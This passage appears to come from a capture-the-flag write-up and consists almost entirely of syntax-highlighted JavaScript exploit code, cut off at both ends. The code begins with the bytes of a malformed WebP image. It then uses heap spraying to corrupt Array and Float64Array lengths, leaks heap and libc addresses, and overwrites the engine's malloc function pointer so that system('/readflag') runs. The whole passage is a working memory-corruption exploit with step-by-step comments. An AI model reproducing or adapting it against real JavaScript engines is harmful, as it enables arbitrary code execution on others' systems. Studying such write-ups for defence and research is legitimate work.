class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">179</span><span class="p">,</span> <span class="mi">122</span><span class="p">,</span> <span class="mi">118</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">247</span><span class="p">,</span> <span class="mi">206</span><span class="p">,</span> <span class="mi">131</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">130</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">146</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">89</span><span class="p">,</span> <span class="mi">61</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">123</span><span class="p">,</span> <span class="mi">231</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="mi">144</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="mi">146</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">140</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">172</span><span class="p">,</span> <span class="mi">158</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">189</span><span class="p">,</span> <span class="mi">243</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">146</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">146</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">185</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">207</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Spray to shape heap
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">let</span> <span class="nx">x</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">y</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">x</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x2fb0</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nx">y</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">2.2</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nx">y</span><span class="p">[</span><span class="nx">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1337</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Free ArrayBuffer, so that malicious webp chunk will be allocated in
</span></span></span><span class="line"><span class="cl"><span class="c1">// the ArrayBuffer freed chunk, leads to overwriting the Array size.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">490</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">x</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="kc">undefined</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Allocate the malicious webp multiple times, with hope that it
</span></span></span><span class="line"><span class="cl"><span class="c1">// overwrite one of the Array size that we spray before
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">isWebP</span><span class="p">(</span><span class="nx">webp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// To check which Array size that was overwritten with the webp,
</span></span></span><span class="line"><span class="cl"><span class="c1">// if we can access element larger than it original size (2), that means
</span></span></span><span class="line"><span class="cl"><span class="c1">// the Array size got overwritten.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">490</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="nx">y</span><span class="p">[</span><span class="nx">i</span><span class="p">][</span><span class="mi">7</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">// We can see that y[492] until y[496] size was overwritten, because the result isn&#39;t undefined
</span></span></span><span class="line"><span class="cl"><span class="c1">// Observed that the Array data type is not a good write primitive.
</span></span></span><span class="line"><span class="cl"><span class="c1">// One element takes 0x10 bytes, and we can only write 4 bytes per 0x10 bytes.
</span></span></span><span class="line"><span class="cl"><span class="c1">// So, we need to have a stronger write and read primitive.
</span></span></span><span class="line"><span class="cl"><span class="c1">//
</span></span></span><span class="line"><span class="cl"><span class="c1">// Moving forward, we will use y[496] as our limited OOB write.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// Spray Float64Array, with hope that this will be located
</span></span></span><span class="line"><span class="cl"><span class="c1">// below the corrupted Array.
</span></span></span><span class="line"><span class="cl"><span class="c1">// We plan to overwrite this size with our limited write primitive from Array later.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">let</span> <span class="nx">z</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">200</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">z</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="k">new</span> <span class="nx">Float64Array</span><span class="p">(</span><span class="mh">0x2</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nx">z</span><span class="p">[</span><span class="nx">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mf">2261634.5098039214</span><span class="p">;</span> <span class="c1">// Use this as mark (float representation of 0x4141414141414141)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">z</span><span class="p">[</span><span class="nx">i</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mf">2261634.5098039214</span><span class="p">;</span> <span class="c1">// Use this as mark (float representation of 0x4141414141414141)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Based on observation in gdb, overwriting these 
</span></span></span><span class="line"><span class="cl"><span class="c1">// offsets will overwrite:
</span></span></span><span class="line"><span class="cl"><span class="c1">// - FloatArray64[0] value to 0x37373737, so that later we can use this
</span></span></span><span class="line"><span class="cl"><span class="c1">//   value as the mark of which FloatArray64 that the size got overwritten
</span></span></span><span class="line"><span class="cl"><span class="c1">// - FloatArray64 size value to 0x37373737
</span></span></span><span class="line"><span class="cl"><span class="c1">// We want to corrupt two FloatArray64.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">y</span><span class="p">[</span><span class="mi">496</span><span class="p">][</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x37373737</span><span class="p">;</span> <span class="c1">// FloatArray64[0]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">y</span><span class="p">[</span><span class="mi">496</span><span class="p">][</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x37373737</span><span class="p">;</span> <span class="c1">// FloatArray64 size
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">y</span><span class="p">[</span><span class="mi">496</span><span class="p">][</span><span class="mi">28</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x37373737</span><span class="p">;</span> <span class="c1">// Other FloatArray64[0]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">y</span><span class="p">[</span><span class="mi">496</span><span class="p">][</span><span class="mi">34</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x37373737</span><span class="p">;</span> <span class="c1">// Other FloatArray64 size
</span></span></span><span class="line"><span class="cl"><span class="c1">// IMPORTANT NOTES: 
</span></span></span><span class="line"><span class="cl"><span class="c1">// If you add console.log later, this might change the heap layout,
</span></span></span><span class="line"><span class="cl"><span class="c1">// so you might need to tweak the offset in here.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// To check which FloatArray64 that we overwrite just now,
</span></span></span><span class="line"><span class="cl"><span class="c1">// if the first element value is no longer 2261634.5098039214,
</span></span></span><span class="line"><span class="cl"><span class="c1">// that means we found the correct index.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">200</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="nx">z</span><span class="p">[</span><span class="nx">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">// We can see that index 82 and 83 is the one that we overwrite the size.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// Based on observation in gdb:
</span></span></span><span class="line"><span class="cl"><span class="c1">// - offset 7 will give us heap leak (heap_base+0xf30)
</span></span></span><span class="line"><span class="cl"><span class="c1">// - offset 14 will give us libc leak
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">let</span> <span class="nx">leaked_heap</span> <span class="o">=</span> <span class="nx">z</span><span class="p">[</span><span class="mi">82</span><span class="p">][</span><span class="mi">7</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">leaked_libc</span> <span class="o">=</span> <span class="nx">z</span><span class="p">[</span><span class="mi">82</span><span class="p">][</span><span class="mi">14</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Now, if we look at JSRuntime, it stored a list of function pointer called JSMallocFunctions.
</span></span></span><span class="line"><span class="cl"><span class="c1">// It is stored in the heap, specifically at heap_base+0x2a0.
</span></span></span><span class="line"><span class="cl"><span class="c1">// When we call js_malloc, it will call js_malloc_rt, which will call
</span></span></span><span class="line"><span class="cl"><span class="c1">// rt-&gt;mf.js_malloc(&amp;rt-&gt;malloc_state, size),
</span></span></span><span class="line"><span class="cl"><span class="c1">// which basically call the first stored function pointer.
</span></span></span><span class="line"><span class="cl"><span class="c1">//
</span></span></span><span class="line"><span class="cl"><span class="c1">// If we overwrite:
</span></span></span><span class="line"><span class="cl"><span class="c1">// - rt-&gt;mf.js_malloc to system
</span></span></span><span class="line"><span class="cl"><span class="c1">// - rt-&gt;malloc_state to /readflag
</span></span></span><span class="line"><span class="cl"><span class="c1">// we can easily call /readflag when we try to create new ArrayBuffer, because
</span></span></span><span class="line"><span class="cl"><span class="c1">// creating new ArrayBuffer will trigger js_array_buffer_constructor3, which eventually
</span></span></span><span class="line"><span class="cl"><span class="c1">// will call js_malloc.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// Overwrite z[82] stored pointer of buffer to heap+0x2c0 (rt-&gt;malloc_state),
</span></span></span><span class="line"><span class="cl"><span class="c1">// so that when we assign value to z[82][0], 
</span></span></span><span class="line"><span class="cl"><span class="c1">// we will overwrite heap+0x2c0 to our controlled value
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">rt_malloc_state</span> <span class="o">=</span> <span class="nx">d2u</span><span class="p">(</span><span class="nx">leaked_heap</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">rt_malloc_state</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-=</span> <span class="p">(</span><span class="mh">0xf30</span><span class="o">-</span><span class="mh">0x2c0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">// Overwrite Float64Array-&gt;buffer stored pointer to rt-&gt;malloc_state
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">z</span><span class="p">[</span><span class="mi">82</span><span class="p">][</span><span class="mi">11</span><span class="p">]</span> <span class="o">=</span> <span class="nx">u2d</span><span class="p">(</span><span class="nx">rt_malloc_state</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nx">rt_malloc_state</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="c1">// Overwrite rt-&gt;malloc_state to /readflag
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">z</span><span class="p">[</span><span class="mi">82</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mf">1.9963908301139611</span><span class="nx">e</span><span class="o">+</span><span class="mi">161</span> <span class="c1">// /readfla
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">z</span><span class="p">[</span><span class="mi">82</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mf">5.1</span><span class="nx">e</span><span class="o">-</span><span class="mi">322</span> <span class="c1">// g
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// Overwrite z[83] stored pointer of buffer to heap+0x2a0 (rt-&gt;mf), 
</span></span></span><span class="line"><span class="cl"><span class="c1">// so that when we assign value to z[83][0],
</span></span></span><span class="line"><span class="cl"><span class="c1">// we will overwrite heap+0x2a0 to our controlled value
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">rt_mf</span> <span class="o">=</span> <span class="nx">d2u</span><span class="p">(</span><span class="nx">leaked_heap</span><span class="p">);</span>
